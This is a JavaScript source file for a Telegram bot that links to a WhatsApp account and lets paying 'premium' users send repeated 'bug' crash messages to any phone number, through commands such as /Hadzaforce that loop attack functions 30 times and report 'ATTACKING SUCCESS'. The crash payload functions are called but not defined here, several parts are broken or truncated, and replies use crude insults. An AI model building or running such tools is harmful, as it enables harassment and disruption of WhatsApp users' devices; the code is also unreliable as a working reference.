const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const axios = require("axios");
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
   "https://files.catbox.moe/ry34t3.mp4",
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const GITHUB_TOKEN = 'yosh';  
const REPO_OWNER = 'yosh';  
const REPO_NAME = 'yosh'; 
const FILE_PATH = 'yosh';  

// Fungsi untuk memeriksa apakah pengguna adalah developer yang diizinkan
//
const DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;

// Fungsi untuk mengambil database
async function getDatabase() {
    try {
        const response = await axios.get(DATABASE_URL, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
            },
        });

        const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
        return { data: JSON.parse(fileContent), sha: response.data.sha };
    } catch (error) {
        console.error('Gagal mengambil database:');
        throw new Error('Gagal mengambil database.');
    }
}

// Fungsi untuk memperbarui database
async function updateDatabase(updatedData, sha) {
    try {
        const updatedContent = Buffer.from(JSON.stringify(updatedData, null, 2)).toString('base64');
        await axios.put(
            DATABASE_URL,
            {
                message: 'Memperbarui data pengguna.',
                content: updatedContent,
                sha,
            },
            {
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                },
            }
        );
    } catch (error) {
        console.error('Gagal memperbarui database:', error);
        throw new Error('Gagal memperbarui database.');
    }
}

// Fungsi untuk menghapus reseller dari database
async function removeResellerFromDatabase(userId) {
    try {
        // Mendapatkan database dari GitHub
        const { data, sha } = await getDatabase();

        // Cek apakah ada data reseller dan apakah userId ada di dalamnya
        if (!data.resellers || !data.resellers.includes(userId)) {
            return false; // Reseller tidak ditemukan
        }

        // Hapus reseller berdasarkan ID
        data.resellers = data.resellers.filter((id) => id !== userId);

        // Perbarui database di GitHub
        await updateDatabase(data, sha);

        return true; // Reseller berhasil dihapus
    } catch (error) {
        console.error("Gagal menghapus reseller:", error);
        throw new Error("Gagal menghapus reseller.");
    }
}

// Fungsi untuk menambahkan reseller ke database
async function addResellerToDatabase(userId) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.resellers) {
            data.resellers = [];
        }

        if (data.resellers.includes(userId)) {
            return false;
        }

        data.resellers.push(userId);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan reseller:', error);
        throw new Error('Gagal menambahkan reseller.');
    }
}

// Fungsi untuk menambahkan token ke database
async function addTokenToDatabase(token) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.tokens) {
            data.tokens = [];
        }

        if (data.tokens.includes(token)) {
            return false;
        }

        data.tokens.push(token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan token:', error);
        throw new Error('Gagal menambahkan token.');
    }
}

// Fungsi untuk menghapus token dari database
async function removeTokenFromDatabase(token) {
    try {
        const { data, sha } = await getDatabase();

        if (!data.tokens || !data.tokens.includes(token)) {
            return false;
        }

        data.tokens = data.tokens.filter(t => t !== token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menghapus token:', error);
        throw new Error('Gagal menghapus token.');
    }
}
//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐛𝐞𝐥𝐮𝐦 𝐭𝐞𝐫𝐡𝐮𝐛𝐮𝐧𝐠 𝐛𝐞𝐠𝐨 𝐛𝐞𝐭 𝐬𝐢 𝐥𝐮 𝐦𝐨𝐧𝐠!
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @Ditthscrash. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╭━─━( 𝙃𝘼𝘿𝙕𝘼𝙉𝙀 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 )━─━⍟
┃ ▢ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝙈𝙤𝙣𝙜𝙜𝙜𝙓𝙮𝙖𝙢𝙚𝙩𝙚𝙚𝙚
┃
┃ ▢ 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 : @𝘾𝙞𝙠𝙯𝙮𝙁𝙡𝙤𝙬 & @𝙖𝙡𝙬𝙖𝙮𝙨𝙆𝙮𝙮𝙮𝙮𝙮
┃
┃ ▢ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
┃
┃ ▢ 𝐋𝐀𝐍𝐆𝐔𝐀𝐆𝐄 : Javascript 
┃
┃ ▢ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁𝐔𝐆 𝐌𝐄𝐍𝐔', 'belial'),
             Markup.button.callback('𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ⌟', 'https://t.me/'),
             Markup.button.url('⌜ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐈𝐒 ⌟', 'https://t.me/MongggXyameteeee'),
         ]
       ])
    });
});

bot.action('belial', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( 𝙃𝘼𝘿𝙕𝘼𝙉𝙀 𝙀𝙓𝙀𝘾𝙐𝙏𝙀𝘿 )━─━⍟
┃ ▢ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝙈𝙤𝙣𝙜𝙜𝙜𝙓𝙮𝙖𝙢𝙚𝙩𝙚𝙚𝙚
┃
┃ ▢ 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 : @𝘾𝙞𝙠𝙯𝙮𝙁𝙡𝙤𝙬 & @𝙖𝙡𝙬𝙖𝙮𝙨𝙆𝙮𝙮𝙮𝙮𝙮
┃
┃ ▢ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
┃
┃ ▢ 𝐋𝐀𝐍𝐆𝐔𝐀𝐍𝐆𝐄 : Javascript 
┃
┃ ▢ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
┏━━[  𝗠𝗘𝗡𝗨 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 ]
┃
┃✘ /Hadzaforce 628xxx
┃     #ForceXdelay
┃
┃✘ /Hadzaforcev2 628xxx
┃     #BlankUi
┃
┃✘ /Hadzadelay 628xxx
┃     #DelayXblank
┃
┃𝙃𝘼𝙃𝘼 𝘼𝙍𝙀𝙀 𝙔𝙊𝙐𝙐 𝙍𝙀𝘼𝘿𝙔 𝘽𝙍𝙊𝙊?
┃©𝘿𝘼𝙈𝙊𝙉𝙂𝙂_𝙈𝙀𝙉𝙂𝙂𝘼𝙇𝘼𝙐🥀
┗━━━━━━━━━━━━━━━━━━━━❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('belial2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( 𝐇𝐀𝐃𝐙𝐀 𝐎𝐖𝐍𝐄𝐑 )━─━⍟
┃ ▢ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝙈𝙤𝙣𝙜𝙜𝙜𝙓𝙮𝙖𝙢𝙚𝙩𝙚𝙚𝙚
┃
┃ ▢ 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 : @𝘾𝙞𝙠𝙯𝙮𝙁𝙡𝙤𝙬 & @𝙖𝙡𝙬𝙖𝙮𝙨𝙆𝙮𝙮𝙮𝙮𝙮
┃
┃ ▢ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
┃
┃ ▢ 𝐋𝐀𝐍𝐆𝐔𝐀𝐍𝐆𝐄 : Javascript 
┃
┃ ▢ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
╔══❮ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗠𝗘𝗡𝗨 ❯══❍
║
║𖤐 /addadmin
║𖤐 /deladmin
║𖤐 /addprem 
║𖤐 /delprem 
║𖤐 /cekprem
║𖤐 /connect 628xx 
║ 
╚══════════❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁𝐔𝐆 𝐌𝐄𝐍𝐔', 'belial'),
             Markup.button.callback('𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ⌟', 'https://t.me/'),
             Markup.button.url('⌜ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐈𝐒 ⌟', 'https://t.me/MongggXyameteeee'),
         ]
]);

  const caption = `\`\`\`
Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @erebustrash. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╭━─━( 𝐇𝐀𝐃𝐙𝐀 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 )━─━⍟
┃ ▢ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝙈𝙤𝙣𝙜𝙜𝙜𝙓𝙮𝙖𝙢𝙚𝙩𝙚𝙚𝙚𝙚
┃
┃ ▢ 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 : @𝘾𝙞𝙠𝙯𝙮𝙁𝙡𝙤𝙬 & @𝙖𝙡𝙬𝙖𝙮𝙨𝙆𝙮𝙮𝙮𝙮𝙮
┃
┃ ▢ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.2
┃
┃ ▢ 𝐋𝐀𝐍𝐆𝐔𝐀𝐍𝐆𝐄 : Javascript 
┃
┃ ▢ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒🥀 』
┃
┃𝐇𝐔𝐅𝐓 𝐓𝐄𝐑𝐋𝐀𝐋𝐔 𝐄𝐙𝐙 𝐈𝐍𝐈𝐌𝐀𝐇 👎
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'demeter'),
                       Markup.button.url('⌜ 𝖉𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 ⌟', 'https://t.me/MongggXyameteeee'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By Demeter')));
    })();
}

bot.command("Hadzaforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/Hadzaforce 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿 𝙏𝙊 𝘽𝙐𝙂 𝙁𝙊𝙍𝘾𝙀✅`);

   for (let i = 0; i < 30; i++) {
      await paradoxes(target);
   }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━━━━━━━━━━━━━━━━━━━━⟡
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒🥀 』
┃
┃𝐇𝐔𝐅𝐓 𝐓𝐄𝐑𝐋𝐀𝐋𝐔 𝐄𝐙𝐙 𝐈𝐍𝐈𝐌𝐀𝐇 👎
┃𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("Hadzaforcev2", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/Hadzabforcev2 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿 𝙏𝙊 𝘽𝙐𝙂 𝘽𝙐𝙇𝘿𝙊𝙕✅`);

   for (let i = 0; i < 30; i++) { 
      await DoctForceCore(target);
   }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━━━━━━━━━━━━━━━━━━━━⟡
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒🥀 』
┃
┃𝐇𝐔𝐅𝐓 𝐓𝐄𝐑𝐋𝐀𝐋𝐔 𝐄𝐙𝐙 𝐈𝐍𝐈𝐌𝐀𝐇 👎
┃𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("Hadzablank", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/Hadzablank 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿 𝙏𝙊 𝘽𝙐𝙂 𝘽𝙇𝘼𝙉𝙆✅`);

   for (let i = 0; i < 30; i++) {
      await hadzane
      
   }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━━━━━━━━━━━━━━━━━━━━⟡
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒🥀 』
┃
┃𝐇𝐔𝐅𝐓 𝐓𝐄𝐑𝐋𝐀𝐋𝐔 𝐄𝐙𝐙 𝐈𝐍𝐈𝐌𝐀𝐇 👎
┃𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 si kontol ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ lu udah jadi pengguna premium goblok.`);
    } else {
        return ctx.reply(`❌ lu bukan pengguna premium kontol.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <628xxx>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝙇𝙪 𝙉𝙞𝙝 𝘼𝙣𝙟𝙞𝙣𝙜

𝗡𝗼𝗺𝗼𝗿 𝙉𝙮𝙖: ${phoneNumber}
𝗞𝗼𝗱𝗲 𝙉𝙮𝙖: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~FUNC
           
// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
